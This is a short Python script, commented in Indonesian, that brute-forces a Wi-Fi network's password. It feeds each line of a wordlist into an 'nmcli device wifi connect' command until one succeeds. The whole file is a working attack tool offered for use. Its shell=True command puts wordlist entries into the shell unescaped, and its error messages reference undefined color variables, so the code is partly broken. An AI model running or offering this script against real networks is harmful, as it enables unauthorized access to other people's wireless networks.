import subprocess

interface = "<_interface_>"
ssid = "<_ssid_>"
wordlist = "<_wordlist_>"

kata_sandi_ditemukan = False

try:
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as w:
        daftar_kata_sandi = w.read().splitlines()
        for kata_sandi in daftar_kata_sandi:
            perintah_crack = f"nmcli device wifi connect {ssid} password {kata_sandi}"
            try:
                hasil_perintah_crack = subprocess.run(perintah_crack, shell=True, capture_output=True, text=True)
                if hasil_perintah_crack.returncode == 0:   
                    print(f"[+] Berhasil terhubung ke SSID '{ssid}'")
                    kata_sandi_ditemukan = True 
                    break
                else:
                    print(f"[+] Gagal terhubung ke SSID '{ssid}'")
            except KeyboardInterrupt:
                print(f"\n{p}[{m}-{p}] Program dihentikan oleh pengguna.{r}")
                exit(1)
            except Exception as e:
                print(f"\n{p}[{m}-{p}] Terjadi kesalahan: {e}.{r}")
                exit(1)
        if not kata_sandi_ditemukan:
            print(f"{p}[{m}-{p}] Kata sandi tidak ditemukan, coba file Wordlist yang lain.{r}")
except Exception as e:
    print(f"\n{p}[{m}-{p}] Terjadi kesalahan: {e}.{r}")
    exit(1)
